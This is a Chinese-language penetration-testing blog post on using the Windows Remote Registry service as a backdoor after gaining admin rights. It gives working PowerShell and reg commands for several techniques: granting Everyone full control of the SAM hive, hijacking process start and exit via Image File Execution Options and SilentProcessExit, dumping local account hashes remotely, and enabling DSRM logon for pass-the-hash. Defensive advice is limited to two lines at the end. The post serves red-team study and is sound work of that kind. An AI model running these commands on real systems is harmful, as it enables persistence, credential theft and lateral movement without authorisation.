---
layout: post
title: 渗透技巧——Windows下的Remote Registry
---


## 0x00 前言
---

Windows下的Remote Registry允许远程用户修改当前计算机的注册表设置

在渗透测试中，获得了管理员权限后，可以利用Remote Registry服务作为后门

我受到harmj0y博客的启发，打算对Remote Registry的后门利用方法做扩展，并且加入一些我在研究GPO的经验，整理成文。

参考资料：

http://www.harmj0y.net/blog/activedirectory/remote-hash-extraction-on-demand-via-host-security-descriptor-modification/


## 0x01 简介
---

本文将要介绍以下内容：

- Remote Registry的开启方法
- 工作组和域环境下的利用方法
- 防御检测


## 0x01 Remote Registry的正常使用
---

测试环境：

- Win7x64
- 192.168.112.128

### 1、开启Remote Registry服务

```
net start remoteregistry
```

### 2、添加ACL(Access Control List)

注册表位置：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg`

#### (1)通过界面添加权限，指定用户

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/2-1.png)

#### (2)通过poweshell实现

添加用户test1的完全访问权限

```
$acl = Get-Acl HKLM:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg
$person = [System.Security.Principal.NTAccount]"test1"
$access = [System.Security.AccessControl.RegistryRights]"FullControl"
$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
$propagation = [System.Security.AccessControl.PropagationFlags]"None"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
$person,$access,$inheritance,$propagation,$type)
$acl.AddAccessRule($rule)
Set-Acl HKLM:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg $acl
```

### 3、远程连接

使用另一台主机，连接192.168.112.128

#### (1)通过regedit.exe

`File`-> `Connect Network Registry...`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/2-2.png)

填入IP，接着输入用户test1的口令，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/2-3.png)

连接成功后，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/2-4.png)

#### (2)通过powershell实现

先建立ipc连接：

```
net use \\192.168.112.128 /u:test1 Password123!
```

查询192.168.112.128的注册表项：`HKLM:\System\CurrentControlSet`

```
$computer1='192.168.112.128'
$Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$computer1)
$RegSubKey = $Reg.OpenSubKey("System\CurrentControlSet")
$RegSubKey.GetSubKeyNames()
```


## 0x02 利用方法1：远程执行程序
---

如果能够修改远程计算机的注册表设置，那么可以选择使用映像劫持，劫持进程的启动或者进程的结束

### 1、工作组环境

以劫持`notepad.exe`为例，实际启动的进程为`calc.exe`

劫持进程的启动：

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v debugger /t REG_SZ /d "c:\windows\system32\calc.exe"
```

劫持进程的结束：

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "c:\windows\system32\calc.exe"
```

**注：**

该方法学习自https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/


### 2、域环境

域环境相比于工作组环境，存在一个可稳定的利用进程：taskhost.exe

默认情况下，域环境下的计算机组策略每90分钟更新，随机偏移为0-30分钟，域控制器的组策略每5分钟更新，组策略更新时会启动进程taskhost.exe

也可以强制刷新组策略：

#### (1)已有域管理员权限，刷新指定计算机的组策略

```
Invoke-GPUpdate -Computer "TEST\COMPUTER01"
```

#### (2)刷新当前计算机的组策略，可用于测试环境下该方法的验证

```
gpupdate /force
```

**注：**

详细的利用测试可参考之前的文章[《域渗透——利用GPO中的计划任务实现远程执行》](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/)

劫持taskhost.exe进程的启动：

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe" /v debugger /t REG_SZ /d "c:\windows\system32\calc.exe"
```

劫持taskhost.exe进程的结束：

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\taskhost.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\taskhost.exe" /v MonitorProcess /t REG_SZ /d "c:\windows\system32\calc.exe"
```

**注：**

劫持taskhost.exe进程的结束时，如果选择calc.exe，会弹框提示，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/3-1.png)

## 0x03 利用方法2：获取SAM文件中的用户hash
---

通过注册表的SAM文件，能够还原出当前系统的本地用户hash，详细方法可参考之前的文章[《渗透技巧-通过SAM数据库获得本地用户hash》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash/)

简要流程如下：

1. 读取注册表项`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`下的键值JD、Skew1、GBG和Data中的内容，拼接成syskey
2. 读取注册表项`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users`下每个用户中F项和V项的内容，使用syskey进行一系列的解密

所以如果能够访问远程计算机的注册表文件，就能够还原出远程计算机所有本地用户的hash

在利用上需要注意`HKLM\SAM\SAM`的默认访问权限为`"NT AUTHORITY\SYSTEM"`(Administrator没有访问权限)，想要远程读取，还需要对这个注册表项及子项添加ACL

利用流程如下：

### 1、开启Remote Registry服务

```
net start remoteregistry
```

### 2、添加ACL(Access Control List)

注册表位置如下：

- HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg
- HKEY_LOCAL_MACHINE\SAM\SAM及子项


对以上注册表项添加用户Everyone的完全访问权限，powershell代码如下：
(在192.168.112.128上以System权限执行)

```
function Add-RegistryACL{
[CmdletBinding()]
Param (
[Parameter(Mandatory = $True)]
[String]
[ValidateNotNullOrEmpty()]
$Path
)
$acl = Get-Acl -Path $Path
$person = [System.Security.Principal.NTAccount]"Everyone"
$access = [System.Security.AccessControl.RegistryRights]"FullControl"
$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
$propagation = [System.Security.AccessControl.PropagationFlags]"None"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
$person,$access,$inheritance,$propagation,$type)
$acl.AddAccessRule($rule)
Set-Acl $Path $acl
}
Add-RegistryACL -Path 'HKLM:\SAM\SAM'
Add-RegistryACL -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg'
```

### 3、使用powershell解密还原远程计算机的本地用户hash

使用以下脚本：

https://github.com/HarmJ0y/DAMP/blob/master/RemoteHashRetrieval.ps1

命令如下：

```
import-module .\RemoteHashRetrieval.ps1
Get-RemoteLocalAccountHash -ComputerName '192.168.112.128'
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/4-1.png)

成功获得192.168.112.128上的本地用户hash


### 补充1：

使用powershell解密还原本地所有用户的Hash，代码可参考：

https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1

### 补充2：

针对域控制器，远程导出域控制器的本地用户hash，如果想要在域内使用pass the hash，还需要修改域控制器的注册表，允许DSRM账户远程访问：

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
```

## 0x04 防御检测的建议
---

防御：

1. 如果不需要Remote Registry服务，建议禁用

检测：

1. 如果能够访问远程计算机的注册表文件，可供利用的方法还有很多，在检测上，可以对关键服务器的注册表操作进行监控


## 0x05 小结
---

本文介绍了Windows下的Remote Registry的两种后门利用方法：远程执行程序和获取SAM文件中的用户hash。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)







